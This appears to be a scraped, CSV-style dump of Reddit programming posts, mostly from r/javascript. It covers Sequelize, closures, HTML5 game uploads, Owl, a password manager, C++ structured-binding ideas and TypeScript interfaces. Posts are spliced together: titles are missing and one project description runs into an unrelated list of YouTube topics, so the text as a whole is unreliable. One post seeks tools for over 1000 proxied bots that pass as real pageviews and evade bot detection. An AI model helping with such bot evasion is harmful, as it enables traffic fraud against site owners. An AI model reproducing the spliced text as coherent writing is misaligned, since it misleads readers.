[https://github.com/rlorenzini/mySequelizeTutorial](https://github.com/rlorenzini/mySequelizeTutorial)

A little background for those who are curious. I am a new developer (just over 1 year of coding experience) who went through a bootcamp in Houston. Once I graduated, I became a teacher's assistant. When we started covering the backend (Node.js, Express, pg-promise, Sequelize, postgreSQL, and more) a lot of students were struggling with Sequelize. Personally, I love Sequelize. I never liked creating a bunch of functions to run pg-promise commands when there was a library which already did that for me. I also struggled to grasp pg-promise at the time, so I gravitated to Sequelize.

When I asked some students, they told me the documentation was confusing and difficult to follow. The Sequelize documentation is extensive with literally everything, but I never go there because it is written so poorly. I always went to alternate websites or medium articles to get help with Sequelize. One student specifically said, ""Why is there no good single source for Sequelize?"" It dawned on me I could be the one to make such a thing. Thus, my tutorial was born!

I've been working on it consistently as a sort of pet project / passion. I've always enjoyed writing documentation and reports, but technical tutorials are new to me. That's why I'm here asking for feedback! Thanks in advance.",[AskJS] My Sequelize Tutorial

I know it creates a callable object by wrapping a *function() {}* and possibly creates some closures by having inside *this.someFunction(f){}* but when I try my own example I can't call it or do anything useful.

   var x  = function() { this.someFun = function(f){ console.log(f) } }; 
  x();
  x(1);

The games were quite minimalist in design, with vector style graphics. I think the developer was from the U.K. and the URL may have been his name or a shortened version of his surname. I’m struggling to remember much else really. There must have been 15+ games on the site. Some were iterations if earlier designs.

There are websites that allow to upload HTML5 games. For example:

[https://itch.io/docs/creators/html5](https://itch.io/docs/creators/html5)

HTML5 game usually consists of catalogues and multiple other files.

I would like to make game uploader with python. In my view it should be able to appload all files, and put it in a certain catalogue within a webpage structure. Then it would need to trigger generation of javascript/ jquery files to create htmls with links and a gallery image on the website and link these javascript / jquery commands to a particular HTML5 game index.

I would like to have all of the above automated. The question is can it all be done?

Another thing i AM concerned with is security. Since there would be multiple file to upload, it would be best if the game was in a zip format. Then python should unpack it, put it in the right catalogue and do all the rest written above. However it poses a security issue does not it? Somebody could send me a virus or mess with my website, I wonder how itch.io deals with this problem, and how this problem should be dealt with in general.

I have seen a simple upload image tutorial with python, where Sb meticulously checks if the file is in the one of possibile formats like png, JPG etc. It would be impossible to do all that checking when uploading a game. So there is a security issue isn’t there?

I wonder how i should approach building the automated game uploader like described above. Maybe there are already some tutorials for making such an uploader. Let me know, give your opinion, share thoughts.",How to approach HTML5 game upload?

My employer is demanding that my bot not just gets all information of the page but also gets accepted as a valid pageview (Sorry cant give more details) 

I have found out that my bot needs to execute everything like a real browser would do in order to be not flagged as a bot. And here is the problem, I cant use stuff like selenium because their memory usage is way to heavy (its more than 100 MB for just one session) and its kinda tricky to use proxy with authentication even in headless mode. And I have to execute more than 1000 Bots at the same time. My current bot I have programmed by myself is using not more than 2 MB without even being optimized (its just using plain http).  

Its getting really complicated, because for not being flagged as a bot, I just have to execute some ajax calls (its just 1-2 calls every 10 sec), but their Javascript is just a mess its highly obfuscated (more than 100k LOC) and I cant read it at all even with the firefox debugger (I hate JS and did nothing with it). I can see their calls with the firefox network monitor but I dont understand how they generate the http body due the obfuscasting

So what I am looking for? 

Actually I am looking for a command-line-tool or C-Application which I can give as an argument a website and its executing everything (it would be nice, if it could handle proxy with authentication, modifiable http header, cookie handling etc?)

I am looking for suggestions as to why this can be a good idea or a really bad one. Something in the lines of scenarios where it makes more sense in Java but makes the least sense in Javascript world. I implemented it as a practice project.

Short summary - In Java, streaming methods like filter and map are short-circuited when chained with methods like findFirst, allMatch ([JavaDoc](https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps)).  This provides efficient and optimized runs, by running each item through chained actions, instead of running each action through all items. This is not supported in javascript array actions like map, filter, reduce, every.map() especially can be very expensive operations and need not be executed when chained with actions like 'every' when at least one element does not obey the chained 'every' condition.

Example :

**java**

    ArrayList&lt;int&gt; arr = Arrays.asList(1,2,3,4,5,6); 

arr.stream() .map(item -&gt; { System.out.println(""Processing : "" + item); return 2\*item;    }) .findFirst();

Output: Processing : 1

**javascript**

    let arr = [1,2,3,4,5,6];
    arr.map(item =&gt; { console.log('Processing : ',item);  return 2*item;})

.find(item =&gt; true);

Output:

    Processing : 1
    Processing : 2
    Processing : 3
    Processing : 4
    Processing : 5
    Processing : 6

**jstream**

    let streamArr = new stream([1,2,3,4,5,6]);
    streamArr.map(item =&gt; {console.log('Processing : ', item); return 2*item;})
    .find(item =&gt; true);

Output:

    Processing : 1

3493,2020-02-02 18:02:14,2,1,[removed],how to apply a custom function on html code after inserted from javascript
3494,2020-02-03 07:17:45,4,1," 

When  we are picking classes for the semester (college) we need to manually  enter CRN codes (ID codes for the course) to designated text input  boxes. There's a student plan helper app which exports a js code to  quickly enter CRN's to their boxes and the school said ""the usage of  that script is illegal and will get you into trouble""

My question is, if I use the code anyways, can they detect that I've run a local js code?

Here's a sample js code for two lectures.

`javascript:var  crn=[14305,10984];for(var i=0;i&lt;crn.length;i++){var  d=document.getElementById(""crn_id""+(i+1));d.value=crn[i];}void(0);`

Thanks.",[AskJS] Can a website admin see that I'm running a local js on firefox

&amp;nbsp;",Your weekly /r/javascript recap
3499,2020-02-03 16:51:32,3,1,[removed],Your weekly /r/javascript recap
3500,2020-02-03 21:12:10,2,1,"After his mathematician mom gave him an HTML book, Ivan Liljeqvist of Ivan on Tech read it over and over. “I remember very clearly there was a chapter about the objects and classes in C++,” he said. “I didn’t understand how it worked and why it worked. So I just kept re-reading it and then it clicked after awhile.” 

When he began that book, which was the start of his programming experience, he thought he would know how to develop his own video games by the end. Instead, he came up a bit short, only knowing some HTML tricks.

He moved onto JavaScript, the high level programming language developed by Brave Browser founder Brendan Eich. And then, he spent time learning C++, because he had heard that it was, in fact, the right language to learn––if you wanted to learn video game programming, that is. He was stuck on that language for months, trying to understand how to build even simple apps. He learned about loops, objects, and classes. From there, it was smooth sailing.

“Once you understand the basics, you can apply the same knowledge to other programming languages,” said Ivan. “Programming is not difficult to start with.” 

Yet, people tell Ivan that the reason he learned programming so young was because he was a wunderkind. He disagrees. “The smartest nine year old is still not as smart as the dumbest 20 year old,” he said. “It’s just dedication and interest. If you have the interest, you can always learn programming. You don’t have to be good at math, you don’t have to be Bill Gates or Einstein. It’s easy to start programming, but it’s difficult to master. Many people are so discouraged, because they think that you need to be very smart to even get started. But you absolutely don’t. As long as you find this interesting, and as long as you’re willing to put in the time, you will learn it.”

Not to mention, there are many resources for when you’re stuck programming––not the least of which is the Ivan on Tech Academy, which offers programming courses for Ethereum, EOS, and the Bitcoin Lightning Network. There are YouTube videos, forums, and communities. When Ivan started coding, many of these didn’t exist, however. He recalls watching the always sarcastic Bucky Roberts, who goes by The New Boston on YouTube, and enjoying his videos. 

“It’s so much easier to learn programming with all the content and all the YouTube videos and all the courses and platforms,” Ivan says of today compared to when he started. “So, if you’re interested, you should do it.”

In his youth, Ivan developed several video games, which were available in the app store, though none became popular-––he didn’t want to pay the developer fee to keep them online. These projects were mostly for learning, anyway. He remembers a library called the Cocos engine which he used to develop games for iOS platform, which, as a matter of fact, now has a blockchain library. After that, he began developing on OpenGL, though he realized early on how very low level it is. 

“I tried to make games in OpenGL, which is really an insane task because it’s very, very low level,” said Ivan. “You basically have to draw triangles yourself. It’s not how you should develop games, you should use a game engine.” That’s where Cocos helped.

When he stumbled onto Bitcoin, Ivan liked that it was coded in C, because he was a bit familiar with that programming language. “I could easily start reading the code and understanding the code,” he said. 

He said if they had chosen another language, say, Erlang or Haskell, while it would take a bit more time to understand, he’d probably get the gist of it soon enough. But, for me, it was good that they chose something that I am comfortable with.”

Because it’s a protocol, C++ was a good choice for Bitcoin, says Ivan. “You don’t really want to use Python or other higher level programming languages. With C, you have access to hardware to the extent that is not possible with higher level programming languages. So it is a natural choice, when you’re writing something like Bitcoin.”

He never programmed on Bitcoin, but his developer experience helped him learn certain aspects of Bitcoin, like hashing, digital signatures, and how a system of digital cash without intermediaries, without a central bank or company to control everything, works. When he entered into the space there were many colored coins projects, too, which he looked into from a technical perspective. 

The main thing that really caught his attention, in terms of building applications on blockchain, was Ethereum and Solidity. “There you could truly program whatever you wanted and you had the fully fledged turing complete programming language, which is solidity,” said Ivan. “So it was a whole other level. And you could really express yourself as a developer in so many different ways that simply wasn’t possible on Bitcoin. “ 

A turing complete programming language, which is most these days, is a language that can do everything that a turing machine can do, which, in part, means it can do any type of calculation.  A turing machine is powerful enough to compute anything that can be computed. 

You can build whatever you want on Solidity, says Ivan. “You can express the logic, you can express what the network should do,” he says. “With Bitcoin, you don’t have a turing complete programming language, so you cannot tell the network to do all the things that you could with Ethereum. So Bitcoin doesn’t, for example, have loops. You cannot have a program that is repeating some kind of action over and over again, a certain amount of time to the same extent as on Ethereum. On Bitcoin you cannot really tell the Bitcoin network to do a lot, but on ethereum you have more flexibility. “ 

Solidity is a higher level programming language, similar to JavaScript, where you can create data structures. “You can use arrays, you can have loops, and you can really work like in a normal programming language,” said Ivan. “With Bitcoin, it’s a bit different, because you have a script which is a low level stack based, scripting language. It’s kind of like working in assembly. It’s very low level. You work with a low level operation. In Solidity, you work with your normal concepts, as you do in other programming languages, concepts like loops, classes, functions, methods, which you don’t have in Bitcoin.”

3503,2020-02-04 10:10:35,1,1,"This post is about yet another new javascript framework: [Owl](https://github.com/odoo/owl) made by my company, Odoo.  I think it could be interesting to the javascript community:

* it uses standard ES6 classes instead of functional API,
* it shows that hooks can work really well with class component,
* it has concurrent mode by default, with (some) asynchronous lifecycle methods
* no toolchain required
* single file components out of the box, with tagged template strings

As far as I can tell, most current frameworks seem to move into a functional/pure direction, with a lot of attempts at using concepts such as immutability, classless components, a very sophisticated toolchain, ... (for good reasons) But we think that there is room for a framework that works with classes, that does no black magic, that can be integrated in any toolchain.

Owl is a framework inspired by React/Vue, but is trying very hard to stay simple. It can do a lot with not much code because it leverages standard browser tools, such as a XML parser, native promises and tagged template strings.

Here is a small example of an Owl application:

    import { Component, useState, tags} from '@odoo/owl';
    
    const { xml } = tags;
    
    class Counter extends Component {
      static template = xml`
        &lt;button t-on-click=""state.value++""&gt;
          Click Me! [&lt;t t-esc=""state.value""/&gt;]
        &lt;/button&gt;`;
    
      state = useState({ value: 0 });
    }
    
    class App extends Component {
      static template = xml`
        &lt;div&gt;
          &lt;span&gt;Hello Owl&lt;/span&gt;
          &lt;Counter /&gt;
        &lt;/div&gt;`;
    
      static components = { Counter };
    }
    
    const app = new App();
    app.mount(document.body);

In my (completely biased) opinion, I find Owl extremely exciting. We worked on it for a year to get asynchronous rendering right (it uses internally fibers, kind of like React Fibers), to get higher order components, hooks, and many other non trivial features. It is simple, powerful, and it works (at least, for us).

Thanks for your interest.","Owl: class based components with hooks, reactive state and concurrent mode"

3505,2020-02-07 03:02:35,20,1,"Figured I would share my password manager that I have been working on for a couple months.  
  
[Github](https://github.com/willem445/PasswordVault)  
  
**Details**   
* User's master password is salted and hashed using PBKDF2.   
* User's decrypted master password is used to decrypt a 512 bit random key that is used to encrypt/decrypt password entries.   
* Each password entry is encrypted using AES (256 bit key, 128 bit block).   
* Data is currently stored in local sqlite database.   
   
I would love if someone would like to review the security aspect of my application (most of the encryption magic happens in PasswordVault.Services.EncryptionService and PasswordVault.Services.MasterPasswordService).   
  
**Questions**   
Currently all sensitive data in the database is encrypted. When a user logins, all of the passwords and other sensitive information is decrypted and lives in memory until the user logs out when it is then destroyed. My plan is to eventually have the services and database live behind a web API so that clients such as a webpage, mobile app, and desktop app just talk to the web API vs. directly to the database. Is it best practice to have all the encryption and decryption happen at the server?    
  
There seems to be a couple tradeoffs:   
   
If all encryption happens at the server -   
* Unencrypted data is sent over the web (it should be encrypted by SSL during transmission though, correct?)  
* Unencrypted data lives in memory during the entire login session on the client vs. decrypted when needed (although if a ""hacker"" has access to memory the device is likely compromised anyways)    
   
If encryption happens at the client -   
* client is generally considered unsafe (javascript etc. could be modified)","Password managers seem to be popular, sharing my project PasswordVault"

3524,2020-02-12 16:33:23,0,1,"Hi guys, I made a tool to hide my personal email by using `email alias`. Email alias is basically a forwarding email address: all emails sent to an alias is forwarded to the ""real"" email address. The code has been run in production since several months now and it is stable. It also has some paying customers even the tool is not officially launched yet (still in beta).

The project is coded in Python, with Flask for the web part and `aiosmtpd` for the email handling. Vanilla Html/JS is used on the front-end with Tabler as Bootstrap theme. I decided to not take the SPA/API way as the traditional HTML app is much faster in terms of productivity. DHH also seems to recommend against SPA in his [blog post](https://m.signalvnoise.com/stimulus-1-0-a-modest-javascript-framework-for-the-html-you-already-have/).

The code is pretty well covered by tests and packaged as Docker container to facilitate self-hosting.

The project contains some recurrent themes in almost any Python webapp:

* ORM: backed by SqlAlchemy
* Database migration: Alembic, created by the SqlAlchemy author :)
* Authentication, registration: almost from scratch with some helps from Flask-Login.
* Social login: I used `requests_oauthlib`, a quite low-level lib but turns out to be the most stable one among all the libs I have tried.
* Encryption: jwcrypto, pyopenssl, pycryptodome are all used. The encryption part in Python is a mess as there are too many choices and some are already obsolete.

The project also contains the payment part that is handled by Paddle. I have started out with Stripe but moved to Paddle to not worry about invoices or taxes.

The app is also an OAuth2/OpenId Connect identity provider that offers a privacy-first alternative to the ""Sign in with Facebook/Google/Apple"" button. I decided to not use any OAuth2 library as they are too generic and very hard to custom. 

Apart from the server part in Python, the project also comes with some niceties like a Chrome/Firefox/Safari extension and (soon) mobile apps.

In terms of priorities, I wanted to ask you all what topics would you like to see covered? Here are some initial ideas I had. Feel free to add anything you don't see here.  


(FYI: The site is a two-sided marketplace selling Word documents )  


**Coding Topic Ideas**

1. generating a maximally enjoyable development environment (e.g. seeding data, simulating cron, mirroring production as much as possible etc.)  


2. removing brittleness from integration tests that run on circleci  


3. dealing with the shitshow that is sales tax accounting across multiple currencies  


4. detecting and recovering from production bugs asap  


5. dealing with the real-world mess that is imperfect user input (e.g. when they type emails with a leading space or inconsistent capitalization; when they create a tag that is almost the same as a previous one — like E Guitar vs. Electric Guitar—and now your data is split across two areas)  


6. discussing the 8+ year consequences of certain architectural/software design issues  


7. streamlining massive amounts of config  


8. multi-redundant systems of backup to prevent disaster  


9. designing error messages and a logging strategy that speeds up recovery from errors  


10. a tour of the most evil, insidious bugs I dealt with over the years (I keep a diary for them)  


11. payment systems in-depth (refunds, errors etc.)  


12. caching systems for performance  


13. Javascript frameworks — why I decided to tear mine out and stick with simple, modular JS.  


14. Choosing dependencies that don't come back and bite you in the ass (think about how the JSscape has changed in the last ten years...)  


**Marketing/Business Topics Ideas**

1. how I use data to decide to add/remove a feature  


2. AB testing a web app  


3. technical SEO (microdata, site structure for internal links, google's tools, sitemaps, etc.) — I get 85% of my traffic (and therefore revenue) from SEO, so I know a thing or two  


4. how I use JS and integration tests on all tracking code (critical to get right in my business)  


5. auto-email systems to previous customers for extra sales  


6. Adwords workflow to drive revenue  


7. Analytics workflow to figure out what content working  


8. Writing copy that gets sales (what worked for me vs. didn't)","[AskJS] I want to create a YouTube channel showing the nitty-gritty of programming and maintaining a web-app for 10+ years (scale: 40k monthly uniques, $20k/monthly). What topics are of interest to r/javascript?"

I'd like to make a program (or maybe chrome plugin?) in javascript that automatically edits a specific element in html (the element's ID can will be found by a homemade algorithm).

Say, for example, that I want the my program to edit a facebook html element with id=""background"", adding the attribute style=""backgroundcolor: black"", to change the background color of the interface. Now, I realize that this isn't exactly perhaps possible on facebook, haven't checked, but this is just to give an example. Also, in this example, I'd like the new backgroundcolor to still remain when the website is reloaded.

Now, I've prevoiusly only made my own .js files and used them in my own html code. But in this case, I don't want to have my own html file for this, so would it be more practical to make chrome plugin/add-on? I'm not familiar at all with how these work, but I imagine they'd be able to view the code of any website the user views, and possibly be able to modify it?

I want to console log my request headers.

With Express I can do

const router = express.Router();

router.get('/', (req,res) =&gt; {

Now my question is, how do I do this with the javascript FETCH api?

3558,2020-03-03 01:09:48,13,1,"I like structured bindings from c++17, I have some ideas for improving them for c++23 that I'd love to get preliminary feedback on before potentially getting involved in a paper.

I've seen a few referenced here and there, so I thought I'd unify them all in one post. Some of these ideas I've seen in [stack overflow](https://stackoverflow.com/questions/45541334/can-the-structured-bindings-syntax-be-used-in-polymorphic-lambdas) or inspired by the [pattern matching paper](http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2019/p1371r1.pdf). If other people have proposed these same ideas in active papers, I'd love to know.

Without further ado, let's get started

# Structured bindings as an argument

Wouldn't it be nice if we could declare a structured binding as a parameter in a function definition?

This is a pattern that comes up in range code or code that uses lambdas with tuple/pair args.
    std::unordered_map&lt;string, int&gt; myMap = /* ... */;
    auto transformed = myMap
        | ranges::views::transform([] (const auto&amp; keyValuePair) {
             const auto&amp; [key, value] = keyValuePair;
            // return something from key and value;
          })
        | ranges::to&lt;std::vector&gt;;
I would love to get rid of the `const auto&amp; [k, v] = keyValuePair;` and just write:
    std::unordered_map&lt;string, int&gt; myMap = /* ... */;
    auto transformed = myMap
        | ranges::views::transform([] (const auto&amp; [key, value]) {
            // return something from k and v;
          })
        | ranges::to&lt;std::vector&gt;;
To me has a various obvious meaning, and I think it's not an ambiguous parse AFAIK.

This would also apply to normal functions, not just lambdas. So let's say we had a structured bindings compatible type:
    struct Point {
       int x;
       int y;
    };
And the declaration of the function taking that type 
    void function(Point p);

In the definition it would be nice to write:
    void function(Point [x, y]) {
       // do something with x and y
    }
instead of
    void function(Point p) {
       auto [x, y] = p;
       // do something with x and y
    }
This works as long as `Point` or similar is structured bindings decomposable. The structured binding decomposition would not have to appear in the function declaration, just the definition since this is basically an implementation detail.

And of course, with template/concept all the following would be valid (assuming valid type substitution):
    template &lt;typename T&gt;
    void function(T [x, y]) {}
    void function(auto [x, y]) {}
    void function(Concept auto [x, y]) {}

# Variadic bindings
This isn't my idea, I saw it [here](https://www.reddit.com/r/cpp/comments/8abgg8/variadic_structured_binding/), but it'd be nice to be able to write expressions like the following:
    auto [first, second, ...rest] = unpackable;
Where `first` refs the first element, and `rest` packs the remaining and is usable just like a parameter pack:
    callSomethingVariadic(rest...);
You could also just omit the name `rest` if you didn't care:
    auto [first, second, ...] = unpackable;
This of course could be combined with bindings as parameters above:
    void function(SomeType [first, second, ...rest]) {}

# Named bindings
Currently structured bindings are positional, wouldn't it be cool if we could unpack fields by their name?
    struct Datum {
       string name;
       int id;
       bool isCool;
    } datum;
    
    auto [.isCool] = datum;
    // equivalent to
    auto isCool = datum.isCool;

This is intended to be very similar to what is possible in [Javascript] (https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignmen). This is pattern comes a lot from the pattern matching pattern.
I use `.&lt;identifier&gt;` syntax to be consistent with designator initialization syntax. So that following would be consistent:
    auto[.name, .id, .isCool] = {.name = ""bob"", .id = 2, .isCool = true};
 But ordinality restrictions should be lifted on decomposition, since initialization order does not really apply to structured bindings based on what they really are.
    auto [.id, isCool, .name] = datum;

This would combine well with ""structured bindings as a parameter"" so that you could accept a whole struct as a param (to be future proof) define exactly which args your function needs in its current impl:
    void doSomething(const Datum&amp; [.id, .name]) {
       // do something with name and id
    }

Or write code that concisely genericly expresses expectation of a certain field being present:
    void doSomethingGeneric(const auto&amp; [.foo]) {
       // use foo field of passed in object
    }

## Named unpack with rename
Named unpack with rename could be supported though I'm not 100% sold on it, e.g.:
    auto [newName = .name] = datum;

Instead of:
    auto [.isCool] = datum;
    auto newName = datum.name;

This feature would only be for renames. I would want arbitrary expressions to be disallowed here due to order of evaluation concerns and maintaining structured binding fields as aliases rather than independent variables. So at this point I think the following should be illegal:
    auto [newId = .id + 1] = datum;
Definitely initialization dependent on prior fields should be illegal:
    auto [
      newId = .id,
      newName = name + std::to_string(newId)
    ] = datum;
One problem here is that `[newName = .name]` syntax totally implies that maybe an arbitrary expression can be substituted (as in lambdas). So perhaps we need a different syntax here. Javascript uses a colon for this:
    const {originalName: newName} = obj
But I don't think colon carries the same semantic meaning in c++, so the following would look a little strange in c++
    auto [.name: newName] = datum;
Another option could be fat or skinny arrow as in patter matching:
    auto [.name -&gt; newName] = datum;
    auto [.name =&gt; newName] = datum;
Which by themselves look fine but do not correspond with any other patterns. With this analysis I'm most partial to
    auto [newName = .name] = datum;
which is why I presented it first. But this problem gets even harrier when we talk about nesting...

## Combination with ordinals
In general this would be mostly disallowed in combination with ordinal bindings:
    auto [.isCool, id] = datum; // disallowed
Use one or the other, not both. One exception could be if the named bindings follow all the ordinal ones:
    auto [newName, ..., .id] = datum
meaning, `datum.name` binds to first positional as `newName`, ignore all other positionals and bind `id` as `datum.id`. I don't see a use for this and its very presence suggests structuring a data type so that it has both an ordinal and non-ordinal (named) structure. So my perspective is we should probably just disallow this.

## Variadic named capture?
What about the following:
    auto [.id, .isCool, ...rest] = datum;
On some level you understand what `rest` represents, a data structure that has all the fields of datum except for `.id` and `.isCool` (so just name). I don't really think this is a particularly useful object and we get a lot of hard questions as to what type the rest object actually has and how you're allowed to use it.

## named capture (but with a function)
So far named capture is pretty limited to simple structs (that which can be constructed by designated initializer). What if we had something more powerful:
    std::vector&lt;int&gt; vec; // some integer range
    auto [.begin, .end] = vec;
    // equivalent to:
    auto begin = vec.begin();
    auto end = vec.end();
If we expressed member capture as the rule that:
    auto [.identifier] = val;
is equivalent to:
    auto identifier = std::invoke(&amp;decltype(val)::identifier, val);
This is a pretty radical idea, but I'm just throwing it out there!

# Nested Bindings

This has beeen requested by a few but I wanted to reiterate that it works here and fits well with the above. Nested bindings allow you to do the following:
    struct Datum {
       int first;

       struct Inner {
          double intensity;
          char code;
       } config;

       std::string color;
    } datum;

    auto [first, [intensity, code], color] = datum;

Of course all of the above mesh with this.
As an argument:
    auto function(Datum [first, [intensity, code], color] datum) {}
Variadics with named capture:
    auto [first, [.intensity], ...] = datum;
Fully nested named:
    auto [[.intensity] = .config] = datum;

We can see that the rename syntax doesn't work great with nesting. Consider the following type:
    struct Outer {
      struct Middle {
        struct Inner {
          int x;
          int y;
        };

        Innter inner;
      };

      Middle middle;
    } val;

We have several options to decompose this and get `int x, int y` in the end:
    auto [[[x, y]]] = val; // pure postional nested
    auto [[[.y, .x]]] = val; // positional nested -&gt; named
    auto [[[.x, .y] = .inner] = .mid] = val; // fully renamed
    auto [.x, .y] = val.middle.inner; // non-nested

The lesson here is that this:
    auto [[[.x, .y] = .inner] = .mid] = val;
Is a pretty terrible solution. No one can read that and immediately understand. It reads and writes in the completely wrong direction: you have to start with ""[[["" which means you basically have to know your target variable depth before even writing.
    
Let's recall how javascript does this:
    const {middle: {inner: {x, y}}} = val;
If I'm honest, I still find this highly unreadable, maybe because in javascript the syntax makes me think I'm declaring a dictionary long before it makes me realize I'm referencing the `x` and `y` fields of `val`.

If we c++ this with arrows:
    auto [.middle =&gt; [.inner =&gt; [.x, .y]]] = val;

To me it's still not intuitive what the heck this does from an outsider perspective, but at least it's easier to write than:
    auto [[[.x, .y] = .inner] = .mid] = val;

If we look at ""=&gt;"" from a pattern matching perspective, then some intuition arises. We can describe the following:
    auto [.middle =&gt; [.inner =&gt; [.x, .y]]] = val;

As ""match `val` against having field `.middle`, take result and match against having field `.inner` then take result and match against fields `.x and .y` capturing them.""

So I don't know what to make of this. The ""rename"" syntax as well as how it would apply with nesting is probably the hardest piece to wrangle here and has questionable value, but in my perspective the following:
  
  1. Structured Binding as a param:
     [](auto [k, v]) {}
     // same as [](auto p) {auto [k, v] = p;}

  2. Variadic Bindings:
     auto [a, b, ...] = s;
     // no simple equivalent. for tuples:
     // auto&amp; a = std::get&lt;0&gt;(s);
     // auto&amp; b = std::get&lt;1&gt;(s);

  3. Structured binding by field name
     auto [.x] = s;
     // same as auto x = s.x

  4. Nested structured bindings (positional syntax):
     auto [a, [x, y]] = s;
     // same as: auto [a, tmp] = s; auto [x, y] = tmp;


  5. Combination: `[] (auto [[.x, .y], ...]) {}`
     // same as: [] (auto s) {
     // auto [tmp, ...] = s;
     // auto x = tmp.x;
     // auto y = tmp.y;}

Are useful and pretty intuitive. Having them would allow us to allow for some different programming paradigms. I'd love to hear your thoughts on some of these components as well as references to any papers that are currently proposing some of these ideas! I would love if c++23 brought with it a super powered update to structured bindings, since c++20 did very little to improve them.",[c++23 and beyond] Structured Binding extension ideas

3564,2020-03-07 14:45:45,2,1,"Hello!

I have a major problem. Can't decide whether to stay with pure javascript, or ascend to a high level engine such as Unity.

##### PROBLEM:

- I like low-level coding because I then know what every function does, but high level engines such as Unity do everything for you, and you have to trust that everything is ok

- I currently know javascript and html and css well-enough because I spent 5 months learning them, but it would probably take just as long to learn the ins and outs of Unity

- Eventually, I want to get to a point where I can make ok-enough games, which means that I should lean towards a high-level engine sooner than later

##### BIO:

- Learned gamemaker (javascript) for some years

- Learned ""web dev"" in a 3-month course

- I adore javascript because the syntax just clicks with me because it is not as silly and error-prone as python/ruby, and not as archaically redundant as the C languages 

_________________

##### SOLUTIONS:

##### 1. STAY WITH PURE JAVASCRIPT:

- PROS:

  - I already know it and can start making my text-game immediately

  - It helps me practice the syntax so I don't forget my web dev knowledge

- CONS:

  - Any subsequent game that might require tilemaps, sprites, animations, and such game-specifics might not be able to get them with just the canvas

  - A bigger project might not be as optimized as an engine might be. 

  - There is a question of longetivity and portability

##### 2. LEARN UNITY AND CODE IT WITH JAVASCRIPT:

- PROS:

  - Sturdy, high-level engine with plenty of tutorials, resources, etc...

  - Investment in the future

- CONS:

  - Requires time to learn

  - You have to trust the bloated functions to do everything right, and not mess up unintended things


##### 3. TAKE PURE JAVASCRIPT AS FAR AS IT WILL TAKE ME, WHILE LEARNING UNITY, AND THEN SWITCH

- PROS: 
  
  - Best of both worlds

- CONS:

  - Let's be honest, there is a low chance that this is gonna happen, or be executed adequately


______________________

##### QUESTIONS:


1. What should I do?


2. How far can I take javascript and html and css with Electron or NW.js and Node.js? My games will always be 2d, and at most be as graphically complicated as a zelda game, or a bullet hell shooter. I heard that the canvas is magic and you can do a lot of stuff with it.


3. Am I stupid for prefering to write my own code and reinventing the wheel? All these high level engines look so complicated. Yes, I could just continue to use GameMaker, but I don't want to anymore because they became evil and greedy. 


4. About longetivity. Is it more likely that the new generations of computers will not be compatible with games made in a high level engine, or made with things like Electron or NW.js  that ship a browser with them? Will it be easier/harder to port one or the other to a newer  version of the language?

For one, I find writing CSS extremely annoying because you end up with a wall of text really fast, and the only way to separate code is via extremely descriptive naming, comments, indentation, and collapsing. The alternative being: having one billion css files, with each being 20-50 lines long.


Writing javascript also gets really annoying really fast . When you have some large function or some global functions , and then on top you have some global variables and objects, and then you have to scroll up-down... crazy...

For example, I have a module @types/winston installed, so I uninstalled the normal winston module, and the entire project ceased to function. Typescript of course gives no errors about this, as it's the javascript it compiled causing the issues.

Whether you believe or not, but the fact is [**TypeScript** ](https://solaceinfotech.com/blog/javascript-vs-typescript-a-comparison/)is spreading like wildfire. According to a survey, it was listed as the third most- loved programming language and the fourth most wanted. 

It’s so inevitable since it has replaced vanilla JavaScript as the language of choice for many packages in the JS ecosystem, with some like Yarn even, going similarly as rewriting their entire codebase in TypeScript. We feel one reason for this gigantic rise to be the fact that TypeScript fundamentally is simply JavaScript. This makes the entry bar a lot lower for existing JavaScript developers, and the way that it’s typed may also attract other devs who prefer the features typed languages provide.

This cuts the two different ways, as well, because the simplicity of choosing TypeScript has led to some cases where the language is not being used as effectively as it could be. Numerous developers still write TypeScript like they’re writing JavaScript, and this brings with it some disadvantages. We’ll be taking a look at some real world code written in TypeScript that could be improved to use the language’s strengths.

In TypeScript, an interface basically specifies the expected shape of a variable. It’s as simple as that. Let us see the simple interface to drive the exact idea.

    interface FunctionProps {   foo: string;   bar: number; }

Now if any variable is defined to implement *FunctionProps*, it will have to be an object with the keys *foo* and *bar*. Some other key addition will make TypeScript fail to compile. Let us see this.

    const fProps: FunctionProps = {   foo: 'hello',   bar: 42, }

Now we have an object *fProps* that implements the  *FunctionProps* interface correctly. If I deviate from the shape specified in the interface by, say, writing fProps.foo = 100 or deleting fProps.bar, TypeScript will complain. fProps’ shape needs to match FunctionProps exactly or there will be hell to pay.

    fProps.foo = true ❌ // foo must be a string

Since we’ve gotten that out of the way, let’s look at an example. Take this React functional component method:

    const renderInputBox = (props, attribute, index) =&gt; {   return (     &lt;div key={index} className=""form-group""&gt;       {renderLabel(attribute)}       &lt;InputBox         name={attribute.key}         value={!!isAssetPropAvailable(props, attribute) &amp;&amp; props.inputValue}         onChange={props.handleInputChange}         placeholder={`Enter ${attribute.label}`}       /&gt;     &lt;/div&gt;   ); };

While this is totally fine if you were writing JavaScript, it doesn’t take advantage of interfaces. For what reason is this awful? You don’t get any IntelliSense features that you otherwise would if the method’s argument were typed.

Also, you could easily pass in a prop of an alternate expected that shape to this method and you would be none the wiser because TypeScript would not complain about it. This is simply vanilla JS, and you might as well eliminate TypeScript from the project altogether if everything was written this way. How might we improve this? Take a look at the arguments themselves, how they’re being used, and what shape is expected from them.

We should begin with props. Look at line 7 and you can see that it’s supposed to be an object with a key called inputValue. At line 8, we see another key being accessed from it called handleInputChange, which, from the context, has to an event handler for inputs. We now recognize what shape props should have, and we can create an interface for it.

    interface PropsShape {   inputValue: string;   handleInputChange: (event: React.FormEvent): void; }

Proceeding onward to attribute, we can use the same method to create an interface for it. Take a look at line 6. We’re accessing a key called key from it (clue: it’s an object). On line 9, we’re accessing another key from it called label, and with this information, we can create an interface for it.

    interface AttributeShape {   key: string;   label: string; }

We can now rewrite the method to look like this instead:

    const renderInputBox = (props:PropsShape, attribute:AttributeShape, index:number) =&gt; {   return (     &lt;div key={index} className=""form-group""&gt;       {renderLabel(attribute)}       &lt;InputBox         name={attribute.key}         value={!!isAssetPropAvailable(props, attribute) &amp;&amp; props.inputValue}         onChange={props.handleInputChange}         placeholder={`Enter ${attribute.label}`}       /&gt;     &lt;/div&gt;   ); };

consider the benefits of doing this:

* You get IntelliSense wherever you use this method. And you can immediately see what its arguments should look like without having a look at it.
